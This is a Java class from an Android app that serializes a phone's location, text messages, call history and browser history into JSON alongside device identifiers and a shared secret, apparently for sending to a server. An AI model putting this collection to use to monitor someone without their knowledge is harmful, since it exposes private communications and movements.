package net.scottjulian.lateralus.components.network;


import android.content.Context;
import android.content.SharedPreferences;
import android.location.Location;
import android.preference.PreferenceManager;

import net.scottjulian.lateralus.Config;
import net.scottjulian.lateralus.R;
import net.scottjulian.lateralus.components.device.DeviceReader;
import net.scottjulian.lateralus.components.messaging.TextMessage;
import net.scottjulian.lateralus.components.phone.Phonecall;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;


public class JsonDataCreator {

    public static final String TYPE_LOCATION      = "location";
    public static final String TYPE_TEXT_MESSAGES = "text_messages";
    public static final String TYPE_PHONECALLS    = "phonecalls";
    public static final String TYPE_HISTROY       = "history";
    public static final String TYPE_TEXT          = "text";
    public static final String TYPE_ERROR         = "error";
    public static final String TYPE_REGISTRATION  = "registration";

    private Context _ctx;
    private SharedPreferences _prefs;

    public JsonDataCreator(Context ctx){
        _ctx = ctx;
        _prefs = PreferenceManager.getDefaultSharedPreferences(_ctx);
    }

    public JSONObject createLocationData(Location loc){
        JSONObject root = constructRootJson(TYPE_LOCATION);
        JSONObject locJSON = new JSONObject();
        try{
            locJSON.put("longitude", loc.getLongitude());
            locJSON.put("latitude", loc.getLatitude());
            locJSON.put("time", loc.getTime());
            if(loc.hasAccuracy()){
                locJSON.put("accuracy", loc.getAccuracy());
            }
            if(loc.hasSpeed()){
                locJSON.put("speed", loc.getSpeed());
            }
            if(loc.hasAltitude()){
                locJSON.put("altitude", loc.getAltitude());
            }
            if(loc.hasBearing()){
                locJSON.put("bearing", loc.getBearing());
            }
            root.put("data", locJSON);
            return root;
        }
        catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public JSONObject createTextMessagingData(HashMap<String, ArrayList<TextMessage>> conversations){
        JSONObject root = constructRootJson(TYPE_TEXT_MESSAGES);
        Iterator it = conversations.entrySet().iterator();
        JSONObject convosJSON = new JSONObject();
        try {
            while(it.hasNext()) {
                HashMap.Entry pair = (HashMap.Entry) it.next();
                String phoneNumberKey = (String) pair.getKey();
                ArrayList<TextMessage> messages = (ArrayList<TextMessage>) pair.getValue();
                JSONArray convoValues = new JSONArray();
                for(TextMessage m : messages) {
                    JSONObject txtMsgJSON = new JSONObject();
                    txtMsgJSON.put("phone_number", m.getNumber());
                    txtMsgJSON.put("name", m.getName());
                    txtMsgJSON.put("message", m.getMessageText());
                    txtMsgJSON.put("sent", m.wasSent());
                    txtMsgJSON.put("time_formatted", m.getTime());
                    txtMsgJSON.put("timestamp", m.getTimestamp());
                    txtMsgJSON.put("type", m.getType());
                    convoValues.put(txtMsgJSON);
                }
                convosJSON.put(phoneNumberKey, convoValues);
            }
            root.put("data", convosJSON);
            return root;
        }
        catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public JSONObject createInternetHistoryData(HashMap<String, String> history){
        JSONObject root = constructRootJson(TYPE_HISTROY);
        Iterator it = history.entrySet().iterator();
        JSONArray historyJSON = new JSONArray();
        try{
            while(it.hasNext()){
                HashMap.Entry pair = (HashMap.Entry) it.next();
                String url = (String) pair.getKey();
                String title = (String) pair.getValue();
                JSONObject page = new JSONObject();
                page.put("title", title);
                page.put("url", url);
                historyJSON.put(page);

            }
            root.put("data", historyJSON);
            return root;
        }
        catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public JSONObject createPhonecallData(ArrayList<Phonecall> phonecalls){
        JSONObject root = constructRootJson(TYPE_PHONECALLS);
        JSONArray calls = new JSONArray();
        try{
            for(Phonecall pc : phonecalls){
                JSONObject call = new JSONObject();
                call.put("number",pc.getNumber());
                call.put("name", pc.getName());
                call.put("time_formatted", pc.getTime());
                call.put("timestamp", pc.getTimestamp());
                call.put("incoming", pc.wasIncoming());
                call.put("duration",pc.getDuration());
                calls.put(call);
            }
            root.put("data", calls);
            return root;
        }
        catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public JSONObject createTextData(String message){
        JSONObject root = constructRootJson(TYPE_TEXT);
        JSONObject text = new JSONObject();
        try{
            text.put("message", message);
            root.put("data", text);
            return root;
        }
        catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public JSONObject createErrorData(String errorMessage){
        JSONObject root = constructRootJson(TYPE_ERROR);
        JSONObject error = new JSONObject();
        try{
            error.put("message", errorMessage);
            root.put("data", error);
            return root;
        }
        catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public JSONObject createRegistrationData() {
        JSONObject root = constructRootJson(TYPE_REGISTRATION);
        return root;
    }

    private JSONObject constructRootJson(String type){
        try{
            String token = _prefs.getString(_ctx.getString(R.string.key_for_token), "");
            String email = _prefs.getString(_ctx.getString(R.string.key_for_email), "");
            String uuid = _prefs.getString(_ctx.getString(R.string.key_for_device_id), "");

            JSONObject root = new JSONObject();
            root.put("secret", Config.SECRET);
            root.put("type", type);
            root.put("token", token);
            root.put("uuid", uuid);
            root.put("email", email);
            root.put("number", DeviceReader.getPhoneNumber(_ctx));
            root.put("model", DeviceReader.getDeviceModel());
            root.put("timestamp_millis", System.currentTimeMillis());
            return root;
        }
        catch(Exception e){
            e.printStackTrace();
            return null;
        }
    }


}
